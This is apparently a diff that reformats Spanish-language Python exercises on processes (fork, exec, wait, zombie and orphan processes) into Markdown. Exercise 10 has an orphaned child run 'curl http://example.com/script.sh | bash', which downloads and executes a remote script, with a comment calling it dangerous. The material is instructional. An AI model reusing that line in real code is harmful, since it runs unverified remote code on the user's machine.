@@ -1,4 +1,8 @@
-1
+# Ejercicios de Procesos en Python
+
+## 1. Creación de un proceso hijo
+
+```python
 import os
 
 pid = os.fork()
@@ -6,8 +10,11 @@ if pid == 0:
     print("[HIJO] PID:", os.getpid(), "PPID:", os.getppid())
 else:
     print("[PADRE] PID:", os.getpid(), "Hijo:", pid)
+```
 
-2
+## 2. Creación de múltiples procesos hijos
+
+```python
 import os
 
 for i in range(2):
@@ -18,8 +25,11 @@ for i in range(2):
 
 for _ in range(2):
     os.wait()
+```
 
-3
+## 3. Reemplazo del proceso hijo con `execlp`
+
+```python
 import os
 
 pid = os.fork()
@@ -27,8 +37,11 @@ if pid == 0:
     os.execlp("ls", "ls", "-l")  # Reemplaza el proceso hijo
 else:
     os.wait()
+```
 
-4
+## 4. Creación de hijos con espera
+
+```python
 import os
 import time
 
@@ -43,8 +56,11 @@ def crear_hijo(nombre):
 
 crear_hijo("A")
 crear_hijo("B")
+```
 
-5
+## 5. Proceso zombi
+
+```python
 import os, time
 
 pid = os.fork()
@@ -55,8 +71,11 @@ else:
     print("[PADRE] No llamaré a wait() aún. Observa el zombi con 'ps -el'")
     time.sleep(15)
     os.wait()
+```
 
-6
+## 6. Proceso huérfano
+
+```python
 import os, time
 
 pid = os.fork()
@@ -66,8 +85,11 @@ if pid > 0:
 else:
     print("[HIJO] Ahora soy huérfano. Mi nuevo padre será init/systemd")
     time.sleep(10)
+```
 
-7
+## 7. Creación de múltiples procesos con `fork()`
+
+```python
 import os
 
 for _ in range(3):
@@ -78,8 +100,11 @@ for _ in range(3):
 
 for _ in range(3):
     os.wait()
+```
 
-8
+## 8. Simulación de atención de clientes con procesos
+
+```python
 import os, time
 
 def atender_cliente(n):
@@ -95,8 +120,11 @@ for cliente in range(5):
 
 for _ in range(5):
     os.wait()
+```
 
-9
+## 9. Detección de procesos zombis en `/proc`
+
+```python
 import os
 
 def detectar_zombis():
@@ -114,8 +142,11 @@ def detectar_zombis():
                 continue
 
 detectar_zombis()
+```
 
-10
+## 10. Ejecución de script en proceso huérfano
+
+```python
 import os, time
 
 pid = os.fork()
@@ -125,3 +156,4 @@ else:
     print("[HIJO] Ejecutando script como huérfano...")
     os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
     time.sleep(3)
+```
